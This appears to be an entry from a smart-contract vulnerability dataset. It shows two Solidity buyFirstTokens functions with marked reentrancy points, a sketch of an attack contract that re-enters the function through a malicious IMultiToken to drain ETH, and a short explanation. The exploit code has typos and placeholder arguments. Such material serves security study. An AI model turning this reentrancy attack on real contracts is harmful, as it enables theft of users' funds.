## Vulnerable Code

```javascript
**Instance_1**
function buyFirstTokens(
        IMultiToken _mtkn,
        bytes _callDatas,
        uint[] _starts // including 0 and LENGTH values
   		 )
        public
        payable
    {
        change(_callDatas, _starts);

        uint tokensCount = _mtkn.tokensCount();
        uint256[] memory amounts = new uint256[](tokensCount);
        for (uint i = 0; i < tokensCount; i++) {
            ERC20 token = _mtkn.tokens(i);
            amounts[i] = token.balanceOf(this);
            if (token.allowance(this, _mtkn) == 0) {
                token.asmApprove(_mtkn, uint256(-1));
            }
        }

        _mtkn.bundleFirstTokens(msg.sender, msg.value.mul(1000), amounts);
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);     //vulnerability position_1
        }
        for (i = _mtkn.tokensCount(); i > 0; i--) {         //vulnerability position_2
            token = _mtkn.tokens(i - 1);
            token.asmTransfer(msg.sender, token.balanceOf(this));
        }
    }
    
    
**Instance_2**
    function buyFirstTokens(
        IMultiToken mtkn,
        bytes callDatas,
        uint[] starts, // including 0 and LENGTH values
        uint ethPriceMul,
        uint ethPriceDiv
    )
        public
        payable
    {
        change(callDatas, starts);

        uint tokensCount = mtkn.tokensCount();
        uint256[] memory amounts = new uint256[](tokensCount);
        for (uint i = 0; i < tokensCount; i++) {
            ERC20 token = mtkn.tokens(i);
            amounts[i] = token.balanceOf(this);
            if (token.allowance(this, mtkn) == 0) {
                token.asmApprove(mtkn, uint256(-1));
            }
        }

        mtkn.bundleFirstTokens(msg.sender, msg.value.mul(ethPriceMul).div(ethPriceDiv), amounts);
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
        for (i = mtkn.tokensCount(); i > 0; i--) {
            token = mtkn.tokens(i - 1);
            if (token.balanceOf(this) > 0) {   //different code
                token.asmTransfer(msg.sender, token.balanceOf(this));
            }
        }
    }
}
```



## Exploit Code

```javascript
contract IMultiToken{

}
Contract Attack is IMultiToken{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton tokensCount() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“buyFirstTokens(IMultiToken , bytes,  uint[])”)), Attack(this), ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF IMultiToken object obtained from a malicious address, the method of buyFirstTokens can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter

